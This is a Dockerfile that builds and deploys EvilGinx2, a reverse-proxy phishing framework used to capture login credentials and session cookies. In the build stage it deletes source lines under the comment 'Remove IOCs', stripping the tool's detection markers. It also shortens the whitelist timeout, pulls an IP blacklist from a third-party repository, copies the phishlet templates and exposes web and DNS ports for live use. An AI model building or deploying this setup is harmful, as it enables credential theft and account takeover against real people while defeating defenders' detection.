ARG EVILGINX_BIN="/bin/evilginx"

# Stage 1 - Build EvilGinx2 app
FROM golang:alpine AS build

ARG BUILD_RFC3339="1970-01-01T00:00:00Z"
ARG COMMIT="local"
ARG VERSION="v0.4.0"

ARG GOPATH=/opt/go
ARG GITHUB_USER="kgretzky"
ARG EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
ARG INSTALL_PACKAGES="git go bash make gcc musl-dev"
ARG PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
ARG BLACKLIST="https://raw.githubusercontent.com/vernegogh/dockerginx/main/app/blacklist.txt"
ARG EVILGINX_BIN

# Clone EvilGinx2 Repository
RUN mkdir -p ${GOPATH}/src/github.com/${GITHUB_USER} \
    && apk add --no-cache ${INSTALL_PACKAGES} \
    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://github.com/${GITHUB_USER}/evilginx2 

# Remove IOCs    
RUN sed -i '407d;183d;350d;377d;378d;379d;381d;580d;566d;1456d;1457d;1458d;1459d;1460d;1461d;1462d' ${PROJECT_DIR}/core/http_proxy.go

# Add "security" & "tech" TLD
RUN set -ex \
    && sed -i 's/arpa/tech\|security\|arpa/g' ${PROJECT_DIR}/core/http_proxy.go

# Add date to EvilGinx2 log
RUN set -ex \
    && sed -i 's/"%02d:%02d:%02d", t.Hour()/"%02d\/%02d\/%04d - %02d:%02d:%02d", t.Day(), int(t.Month()), t.Year(), t.Hour()/g' ${PROJECT_DIR}/log/log.go

# Set "whitelistIP" timeout to 10 seconds
RUN set -ex \
    && sed -i 's/10 \* time.Minute/10 \* time.Second/g' ${PROJECT_DIR}/core/http_proxy.go
    

#Build Evilginx
WORKDIR ${PROJECT_DIR}
RUN set -x \
    && go get -v && go build -v \
    && cp -v evilginx2 ${EVILGINX_BIN} 
        
# Stage 2 - Build Runtime Container
FROM alpine:latest

ENV EVILGINX_PORTS="443 80 53/udp"
ARG EVILGINX_BIN

RUN apk add --update && apk add nano \
    ca-certificates \
  && rm -rf /var/cache/apk/*

RUN apk add --no-cache bash && mkdir -v /app

RUN cd /app && wget ${BLACKLIST} -v \
    && mv blacklist.txt root/config/blacklist.txt

# Install EvilGinx2
WORKDIR /app

COPY --from=build ${EVILGINX_BIN} /app/evilginx
COPY --from=build /go/src/github.com/kgretzky/evilginx2/phishlets/*.yaml /app/phishlets/

RUN cd /app/phishlets && \
    rm -r airbnb.yaml amazon.yaml booking.yaml citrix.yaml coinbase.yaml github.yaml okta.yaml onelogin.yaml paypal.yaml protonmail.yaml reddit.yaml tiktok.yaml twitter-mobile.yaml twitter.yaml wordpress.org.yaml

RUN wget ${BLACKLIST} -v \
    && mv blacklist.txt root/config/blacklist.txt
    
VOLUME ["/app/phishlets/"]


COPY ./docker-entrypoint.sh /opt/
RUN chmod +x /opt/docker-entrypoint.sh

# Configure Runtime Container
EXPOSE ${EVILGINX_PORTS}

STOPSIGNAL SIGKILL

ENTRYPOINT ["/opt/docker-entrypoint.sh"]
